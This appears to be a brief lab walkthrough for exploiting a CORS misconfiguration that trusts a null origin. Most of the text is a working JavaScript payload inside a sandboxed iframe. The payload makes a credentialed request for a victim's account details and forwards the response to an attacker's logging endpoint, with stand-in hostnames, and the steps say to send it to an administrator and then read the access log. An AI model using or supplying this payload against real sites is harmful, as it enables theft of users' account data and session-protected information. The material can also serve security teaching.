# Change the origin header to null value

![image](https://github.com/user-attachments/assets/3da97414-460a-4c9b-912a-35379d808a32)


# Send the malicious javascript code to administrator
```
<iframe sandbox="allow-scripts" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','vulnerable website.com/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='malicious website.com/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```
# Check in access log
